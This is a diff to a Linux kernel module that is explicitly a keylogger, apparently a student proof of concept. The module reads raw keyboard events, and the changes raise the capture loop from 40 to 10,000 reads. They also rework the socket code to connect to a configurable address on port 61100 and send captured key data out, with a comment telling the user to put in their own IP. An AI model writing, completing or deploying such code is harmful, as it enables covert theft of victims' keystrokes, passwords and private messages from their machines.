@@ -7,6 +7,8 @@
 #include <linux/uaccess.h>
 #include <linux/in.h>
 #include <linux/seq_file_net.h>
+#include <linux/slab.h>
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Peter Derias z5311768");
@@ -40,7 +42,7 @@ static int __init keylogger_init(void) {
     set_fs(KERNEL_DS);
     // this can be set to "while (1)", and this should never return. Any interrupts trying to cancel the procees or unload it will
     // be responded to with a "busy" error. This is changed since this is a proof of concept.
-    while (i < 40) {
+    while (i < 10000) {
         kernel_read(keyboard, &ev, sizeof(struct input_event), &zero);
         if (ev.value == 1) {
             printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
@@ -62,40 +64,38 @@ static int __init keylogger_init(void) {
                         printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
                         break;
                 }
+            }
+            if (i != 0) {
+                struct msghdr msg;
                 struct sockaddr_in addr = {
                     .sin_family = AF_INET,
                     .sin_port = htons (61100),
                     .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
                 };
-                err = sock->ops->bind (sock, (struct sockaddr *) &addr, sizeof(addr));
-                if (err < 0) {
-                        printk(KERN_INFO "failed binding to port 6110\n");
-                        printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
-                        break;
-                }
-            }
-            if (i != 0) {
-                struct msghdr msg;
-                msg.msg_name = kmalloc(40, GFP_KERNEL);
-                snprintf(msg.msg_name, 40, "your data: i = %d\n", i);
-                msg.msg_namelen = sizeof(msg.msg_name);
-                msg.msg_flags = MSG_TRYHARD;
-
+                msg.msg_name = &addr;
+                msg.msg_namelen = sizeof(addr);
+                msg.msg_flags = 0;
+                msg.msg_control = 0;
+                msg.msg_controllen = 0;
                 struct kvec vec;
                 vec.iov_base = pack;
                 vec.iov_len = sizeof(pack);
+                err = sock->ops->connect(sock, (struct sockaddr *) &addr, sizeof(addr), O_RDWR);
 
-                err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) sizeof(pack));
                 if (err < 0) {
-                        printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
+                        printk(KERN_INFO "failed to connect!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
                         break;
                 }
-                kfree(msg.msg_name);
+                err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) sizeof(pack));
+                if (err < 0) {
+                        printk(KERN_INFO "failed to send!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
+                        break;
+                }
+                sock_release(sock);
             }
         }
         i++;
     }
-    sock_release(sock);
     set_fs(old_fs);
     return 0;
 }
